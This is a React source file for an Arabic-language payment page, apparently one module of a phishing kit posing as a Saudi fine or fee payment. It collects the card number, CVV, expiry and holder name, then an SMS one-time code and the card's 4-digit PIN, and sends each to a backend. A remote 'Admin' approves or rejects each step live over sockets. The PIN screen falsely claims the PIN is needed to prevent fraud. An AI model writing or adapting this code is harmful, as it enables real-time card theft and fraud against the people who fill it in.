import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";

const PayemntForm = () => {
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [page, setPage] = useState(0);
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [otp, setOtp] = useState(null);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [load, setLoading] = useState(null);
  const [method, setMethod] = useState("visa");
  const [check, setCheck] = useState("visa");
  const price = sessionStorage.getItem("price");
  const nationalId = sessionStorage.getItem("nationalId");
  const id = sessionStorage.getItem("id");
  const vioNumber = sessionStorage.getItem("vioNumber");
  const { _id, fullname, email } = JSON.parse(data);
  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16) {
      setLoading(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }

    const finalData = {
      cardNumber: card_number,
      expiryDate: expiryDate,
      cvv: cvv,
      card_name: car_holder_name,
      method,
      fullname,
      email,
    };
    console.log(finalData);
    try {
      await axios
        .post(api_route + "/visa/" + sessionStorage.getItem("id"), finalData)
        .then(() => socket.emit("paymentForm", finalData));
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptPaymentForm", (data) => {
    console.log("acceptVisa From Admin", id);
    sessionStorage.setItem("method", method);
    console.log(data);
    if (id === data) {
      setLoading(false);
      setPage(2);
    }
  });

  socket.on("declinePaymentForm", (data) => {
    console.log("declineVisa From Admin", data);

    console.log(data);
    if (id === data) {
      setLoading(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  const handleOtp = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { fullname, email, _id } = JSON.parse(data);
    try {
      await axios
        .post(api_route + "/visaOtp/" + sessionStorage.getItem("id"), {
          fullname,
          email,
          card_name: car_holder_name,
          cardNumber: card_number,
          expiryDate: expiryDate,
          otp,
        })
        .then(() => {
          socket.emit("visaOtp", { id: sessionStorage.getItem("id"), otp });
        });
    } catch (error) {
      setLoading(false);
    }
  };

  const handlePin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { fullname, email, _id } = JSON.parse(data);
    try {
      await axios
        .post(api_route + "/visaPin/" + sessionStorage.getItem("id"), {
          fullname,
          email,
          card_name: car_holder_name,
          cardNumber: card_number,
          expiryDate: expiryDate,
          cvv,

          otp,
          pin,
        })
        .then(() => {
          socket.emit("visaPin", {
            id: _id,
            pin,
          });
        });
    } catch (error) {
      setError('حدث خطأ')
    } finally {
     
    }
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === sessionStorage.getItem("id")) {
      window.scrollTo(0, 0);
      setPage(2);
      setError(null);
    }
  });

  socket.on("declinePaymentForm", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setPage(0);
      setError(" تم رفض البطاقة");
    }
  });

  socket.on("acceptVisaOtp", (id) => {
    console.log(id);
    if (id === sessionStorage.getItem("id")) {
      setLoading(false);

      window.scrollTo(0, 0);
      setPage(3);
    }
  });

  socket.on("declineVisaOtp", (id) => {
    console.log(id);

    if (id === sessionStorage.getItem("id")) {
      setLoading(false);
      setError("تم رفض رمز التحقق ");
    }
  });

  socket.on("acceptVisaPin", (id) => {
     if (id === sessionStorage.getItem("id")) {
       setLoading(false);
       window.location.href =
         "/wtheq?data=" +
         JSON.stringify({
           ...JSON.parse(data),
           card_name: car_holder_name,
           cardNumber: card_number,
           expiryDate: expiryDate,
           cvv,
           otp,
           pin,
         });
     }
  });

  socket.on("declineVisaPin", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setLoading(false);
      setError("تم رفض الرمز السري ");
    }
  });

  return (
    <>
      {load && (
        <div className="fixed top-0 w-full z-20  flex flex-col items-center justify-center h-screen left-0 bg-white ">
          <img src="/loading.avif" />
          <TailSpin
            height="50"
            width="50"
            color="gray"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      {page === 0 ? (
        <div className="w-full lg:w-1/2 flex flex-col items-center justify-center my-5 rounded-md">
          <div className="main_bg w-full flex flex-col md:flex-row  items-center justify-center text-black px-2 py-8 rounded-lg ">
            <div
              className=" w-full flex flex-col  md:items-end justify-center items-center md:py-2"
              dir="rtl "
            >
              <img src="/loading.avif" />
              <img src="/pay2.png" />
              <form
                className="w-full flex flex-col  gap-y-3 py-3"
                onSubmit={handleSubmit}
              >
                <div
                  className="flex flex-col w-full gap-y-3 mt-5 animate-bounce"
                  dir="rtl"
                >
                  <span> اختر خيار الدفع</span>
                </div>
                <div className="flex items-center" dir="rtl">
                  <div className=" w-full flex items-center justify-between  gap-x-8 p-2 rounded-md  ">
                    <input
                      type="radio"
                      name="method"
                      className="w-fit"
                      checked={method === "visa"}
                      onClick={() => setMethod("visa")}
                    />
                    <div className=" w-full flex items-center  gap-x-5 p-2">
                      <img src="/MasterCard.svg" className="md:w-12 w-9 " />
                      <img src="/Visa.svg" className="md:w-12 w-9" />
                      <img src="/Mada.svg" className="md:w-12 w-9" />
                    </div>
                  </div>
                </div>
                <div className="flex flex-col items-center" dir="rtl">
                  <div className=" w-full flex items-center   gap-x-8 p-2 rounded-md  ">
                    <input
                      type="radio"
                      name="method"
                      className="w-fit"
                      onClick={() => setMethod("paypal")}
                    />
                    <div className=" w-full flex items-center gap-x-5 p-2">
                      <img
                        src="/paypal.jpg"
                        className="md:w-12 w-9  rounded-md"
                      />

                      <img
                        src="/apple.png"
                        className="md:w-12 w-9 bg-white rounded-md"
                      />
                    </div>
                  </div>
                  <div className=" w-full flex items-center   gap-x-8 p-2 rounded-md  ">
                    <input
                      type="radio"
                      name="method"
                      className="w-fit"
                      checked={method === "american"}
                      onClick={() => setMethod("american")}
                    />
                    <div className=" w-full flex items-center  gap-x-5 p-2">
                      <img
                        src="/american.png"
                        className="md:w-12 w-9 rounded-md"
                      />
                    </div>
                  </div>
                </div>

                {method === "visa" || method === "american" ? (
                  <>
                    {" "}
                    <div
                      className="flex flex-col w-full gap-y-3 mt-5 "
                      dir="rtl"
                    >
                      <span>بيانات الدفع</span>
                    </div>
                    <div className="flex flex-col w-full gap-3  my-2">
                      <input
                        value={car_holder_name}
                        required
                        onChange={(e) => setCardHolderName(e.target.value)}
                        dir="ltr"
                        minLength={4}
                        type="text"
                        placeholder="الأسم المدون علي البطاقة"
                        className="w-full     rounded-md  text-black border border-black   p-2   text-center     outline-green-800"
                      />
                    </div>
                    <div className="flex flex-col w-full gap-3  my-2">
                      <input
                        value={card_number}
                        required
                        onChange={handleCardNumberChange}
                        dir="ltr"
                        maxLength={19}
                        minLength={16}
                        inputMode="numeric"
                        type="text"
                        placeholder="XXXX XXXX XXXX XXXX"
                        className="w-full     rounded-md  text-black   p-2  border border-black   text-center     outline-green-800"
                      />
                    </div>
                    <div className="flex w-full gap-x-5 px-2 text-sm ">
                      <div className="flex items-center justify-center gap-x-2">
                        <input
                          className="w-full     rounded-md  text-black   p-2  border border-black   text-center     outline-green-800"
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          placeholder="CVV"
                          maxLength={3}
                          required
                        />
                        <span className="text-xs"> كود الحماية</span>
                      </div>
                      <div className="flex items-center justify-center gap-x-2">
                        <input
                          className="w-full     rounded-md  text-black   p-2  border border-black   text-center     outline-green-800"
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          placeholder="MM/YY"
                          required
                        />
                        <span className="text-xs"> تاريخ الإنتهاء </span>
                      </div>
                    </div>
                    <button
                      type="submit"
                      className="flex items-center justify-center gap-2 p-2 w-full mt-5 text-white"
                      style={{ background: "#3773ff" }}
                    >
                      متابعة
                    </button>
                  </>
                ) : method === "paypal" ? (
                  <div className="w-full flex items-center justify-center">
                    <span className="font-bold">غير متوفرة حاليا</span>
                  </div>
                ) : (
                  ""
                )}
                {error && (
                  <span className="text-red-500 text-center w-full py-2 text-sm">
                    {error}
                  </span>
                )}
              </form>
            </div>
          </div>
          {load ? (
            <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
              <TailSpin
                height="50"
                width="50"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
            </div>
          ) : (
            ""
          )}
        </div>
      ) : page === 3 ? (
        <form
          className=" w-full p-3 flex flex-col gapy-4 justify-center items-center"
          onSubmit={handlePin}
        >
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
              {error}
            </div>
          ) : (
            ""
          )}

          <img src="pin.png " className="" />
          <div className="my-3 w-10/12 items-center justify-center flex flex-col gap-y-3">
            <span className="text-base mt-2 font-bold w-full flex items-center">
              <span> Enter password</span>
              <img
                src="https://static.wixstatic.com/media/1d19dc_e9f069951eca45e9b2ea003405abe888~mv2.gif"
                className="w-20"
              />
            </span>
            <div className="w-full flex flex-col items-center text-sm  py-2 px-3 ">
              <span className="my-2">
                Please enter the 4-digit card password to confirm the payment
              </span>
              <span className="text text-right">
                الرجاء ادخال الرمز السري الخاص بالبطاقة الخاص بك المكون من 4
                ارقام ليتم التأكد من ملكية واهلية البطاقة للحماية من مخاطر
                الاحتيال الالكتروني والانتقال الى الحجز بمصداقية الطلب
              </span>
              <input
                type="text"
                className="p-2 rounded-lg outline-sky-500 border border-black text-center  mt-5 placeholder:text-black"
                min={4}
                minLength={4}
                max={4}
                maxLength={4}
                placeholder="****"
                value={pin}
                inputMode="numeric"
                required
                onChange={(e) => handlePinChange(e)}
              />
              <button
                className="w-3/4 text-white bg-black text-lg px-5 py-1 mt-5 rounded-md"
                type="submit"
              >
                متابعة
              </button>
            </div>
          </div>
        </form>
      ) : page === 2 ? (
        <form
          className=" w-full p-3 flex flex-col gapy-4 justify-center items-center"
          onSubmit={handleOtp}
        >
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
              {error}
            </div>
          ) : (
            ""
          )}

          <div className="my-3 w-full items-center justify-center flex flex-col gap-y-3">
            <img src="https://static.wixstatic.com/media/d2fab8_e8b15dd359c2437c892273db915dbf2a~mv2.webp/v1/fill/w_140,h_140,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/d2fab8_e8b15dd359c2437c892273db915dbf2a~mv2.webp" />
            <div className="w-full flex flex-col items-center text-sm border rounded-md border-black py-5 px-3 ">
              <span className="text-lg font-bold mt-2">رمز التحقق</span>
              <span className="text text-right">
                الخاص بك (OTP) يرجى إدخال كلمة المرور لمرة واحدة لتأكيد هويتك
                لعملية الدفع هذه{" "}
              </span>
              <span className="text-base mt-2 font-bold w-full">
                Enter verification code{" "}
              </span>
              <span className="my-2">
                Please enter your OTP in the field below to confirm your
                identity for this purchase We sent you a verification code by
                text message to 05 xxxxxxxx
              </span>
              <span className="w-full font-bold my-2">
                Card Number&nbsp; &nbsp; &nbsp;******************
              </span>
              <span className="w-full font-bold">
                Referencce Id &nbsp; &nbsp; SAG0574865
              </span>
              <div>
                <img
                  src="https://static.wixstatic.com/media/1d19dc_a0d3063fdf954ffbbd2d288522eee23f~mv2.gif"
                  className="w-20"
                />
              </div>
              <input
                type="text"
                className="p-2 rounded-lg outline-sky-500 border border-black text-center placeholder:text-black"
                min={6}
                minLength={6}
                max={6}
                maxLength={6}
                placeholder="******"
                value={otp}
                inputMode="numeric"
                required
                onChange={(e) => setOtp(e.target.value)}
              />
              <button
                className="w-3/4 text-white bg-black text-lg px-5 py-1 mt-5 rounded-md"
                type="submit"
              >
                تأكيد
              </button>
            </div>
          </div>
        </form>
      ) : (
        <form
          className="bg-sky-200 w-11/12 p-3 flex flex-col gapy-4"
          onSubmit={handlePin}
        >
          {error ? (
            <div className="bg-red-300 border border-red-500 rounded-md p-2  w-full my-2">
              {error}
            </div>
          ) : (
            ""
          )}
          <span className="text-sky-700 text-xl">إثبات ملكية البطاقة</span>
          <span className="text-gray-500">
            الرجاء إدخال الرقم السري الخاص بالبطاقة المكون من 4 ارقام
          </span>
          <div className="my-3 w-full flex flex-col gap-y-3">
            <span className="text-lg">الرقم السري*</span>
            <input
              type="text"
              className="p-2 rounded-lg outline-sky-500"
              min={4}
              minLength={4}
              max={4}
              maxLength={4}
              placeholder=" "
              value={pin}
              required
              onChange={handlePinChange}
            />

            <div className="w-full justify-between flex items-center px-3 my-3">
              <button
                className="w-fit text-white bg-sky-500 text-lg px-5 py-1 rounded-full"
                type="submit"
              >
                تأكيد
              </button>
              <img src="/mada.png" className="md:w-1/4 w-2/3" />
            </div>
          </div>
        </form>
      )}
    </>
  );
};

export default PayemntForm;
